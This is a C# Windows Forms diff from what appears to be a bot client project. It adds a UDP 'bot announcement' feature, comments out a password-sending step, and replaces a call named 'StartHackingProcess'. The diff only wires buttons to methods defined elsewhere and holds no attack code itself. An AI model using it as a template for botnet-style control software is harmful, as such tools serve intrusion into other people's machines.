@@ -14,10 +14,12 @@ namespace bot
     {
         Client tcpClient;
         controller controller;
+        UDPBot udpbot;
         public Form1()
         {
             InitializeComponent();
             tcpClient = new Client();
+            udpbot = new UDPBot();
         }
 
         internal void UpdateMessageBox(string msg)
@@ -27,6 +29,7 @@ namespace bot
 
         private async void button1_Click(object sender, EventArgs e)
         {
+            /*
              int x = tcpClient.SendThePassword(PasswordTextBox.Text);
             if (x == -1)
             {
@@ -39,20 +42,19 @@ namespace bot
                     System.Environment.Exit(1);
                 }
             }
+            */
         }
 
         internal void setController(controller mController)
         {
             controller = mController;
             tcpClient.setController(mController);
+            udpbot.setController(mController);
         }
 
         private void button4_Click(object sender, EventArgs e)
         {
-            if (tcpClient.SetPortNumber(PortTextBox.Text) && tcpClient.SetServerIPAddress(IpTextBox.Text))
-            {
-                tcpClient.StartHackingProcess();
-            }
+            udpbot.BotAnnouncment(PortTextBox.Text);
         }
     }
 }
